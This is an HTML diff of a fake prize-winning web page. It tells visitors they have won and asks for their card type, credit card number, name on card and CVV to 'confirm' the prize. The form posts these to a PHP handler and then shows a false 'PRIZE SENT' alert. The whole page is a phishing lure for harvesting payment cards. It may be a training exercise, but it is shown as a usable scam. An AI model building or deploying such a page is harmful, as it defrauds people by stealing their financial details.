@@ -1,61 +1,74 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <center>
-        <h1><FONT COLOR=red>YOU WON!!</FONT></h1>
-        <h2><FONT COLOR=red>CONGRATS!</FONT></h2>
-    </head>
-   
-    <body style="background-image: url('coins2.jpg');">
-        <p><FONT COLOR=#00fffc>You are one of today's lucky winners! Enter credit card info to confirm your prize:</FONT></p>
+  <head>
+    <center>
+      <h1>
+        <FONT COLOR=red>YOU WON!!</FONT>
+      </h1>
+      <h2>
+        <FONT COLOR=red>CONGRATS!</FONT>
+      </h2>
+  </head>
+  
+  <body style="background-image: url('coins2.jpg');">
+    <p>
+      <FONT COLOR=#00fffc>You are one of today's lucky winners! Enter credit card info to confirm your prize:</FONT>
+    </p>
+    <div>
+      <form action="phpfile.php" method="post">
         <div>
-            <form action="phpfile.php" method="post">
-                <div>   <!--Radio card selection-->
-                    <FONT COLOR=#00fffc>
-                    <input type="radio" id="VISA" name="cctype" value="VISA">
-                    <label for="VISA">VISA</label>
-                    <input type="radio" id="MASTERCARD" name="cctype" value="MASTERCARD">
-                    <label for="VISA">MASTERCARD</label>
-                    <input type="radio" id="AMEX" name="cctype" value="AMEX">
-                    <label for="VISA">AMEX</label>  
-                    </FONT>
-                </div>
-                <div>   <!--Text card details-->
-                    <FONT COLOR=#ff03d1>
-                        <label for="ccn">Credit Card Number:</label><input name="ccn" id="ccn" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
-                        <br/><br/>
-                        NAME: <input type="text" name="name" id="name" onblur="document.getElementById('blank').innerHTML= 'This field is required!'"/> <br/>
-                        <span id="blank"></span><br/>
-                        <br/>
-                        CVV CODE: <input class="required" id="field" type="number" max="999" pattern="([0-9]|[0-9]|[0-9])" name="cvv" placeholder="xxx"/>
-                        <br/><br/>
-                    </FONT>
-                </div>
-
-                <FONT COLOR=yellow>
-                <div>   <!--Selection for country-->
-                    <label for="Countries">Select country:</label>
-                    <select id="Countries" name="Countries">
-                    <option value="United States">United States</option>
-                    <option value="Canada">Canada</option>
-                    </select>
-                    <br/><br>
-                </div>
-                
-                <div>   <!--Check box for agreement-->
-                    <input type="checkbox" id="form" name="form" required/> 
-                    <label for="form">I ACCEPT THE TERMS AND CONDITIONS</label>
-                    <br/><br/>
-                </div>
-                </FONT>
-                
-                <input type="submit" value="submit" onclick="alert('FORM SUBMITTED, PRIZE SENT!!!')"/>
-            </form>
+          <!--Radio card selection-->
+          <FONT COLOR=#00fffc>
+            <input type="radio" id="VISA" name="cctype" value="VISA">
+            <label for="VISA">VISA</label>
+            <input type="radio" id="MASTERCARD" name="cctype" value="MASTERCARD">
+            <label for="VISA">MASTERCARD</label>
+            <input type="radio" id="AMEX" name="cctype" value="AMEX">
+            <label for="VISA">AMEX</label>
+          </FONT>
         </div>
-        <br/>
-        <img src="jackpot.jpg" alt="Jackpot" width="400" height="300">
-        <br/>
-
+        <div>
+          <!--Text card details-->
+          <br/><br/>
+          <FONT COLOR=#ff03d1>
+            <label for="ccn">CREDIT CARD NUMBER:</label>
+            <input name="ccn" id="ccn" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx" />
+            <br />
+            <br /> NAME ON CARD: <input type="text" name="cardname" id="cardname" onblur="document.getElementById('blank').innerHTML= 'This field is required!'" />
+            <br />
+            <span id="blank"></span>
+            <br />
+            <br /> CVV CODE: <input class="required" id="field" type="number" min="000" max="999" pattern="([0-9]|[0-9]|[0-9])" name="cvv" placeholder="xxx" />
+            <br />
+            <br />
+          </FONT>
+        </div>
+        <FONT COLOR=yellow>
+          <div>
+            <!--Selection for country-->
+            <label for="countries">Select country:</label>
+            <select id="countries" name="countries">
+              <option value="united states">United States</option>
+              <option value="canada">Canada</option>
+              <option valie="other">other</option>
+            </select>
+            <br />
+            <br>
+          </div>
+          <div>
+            <!--Check box for agreement-->
+            <input type="checkbox" id="form" name="form" required />
+            <label for="form">I ACCEPT THE TERMS AND CONDITIONS</label>
+            <br />
+            <br />
+          </div>
+        </FONT>
+        <input type="submit" value="submit" onclick="alert('FORM SUBMITTED, PRIZE SENT!!!')" />
+      </form>
+    </div>
+    <br />
+    <img src="jackpot.jpg" alt="Jackpot" width="400" height="300">
+    <br />
     </center>
-    </body>
+  </body>
 </html>
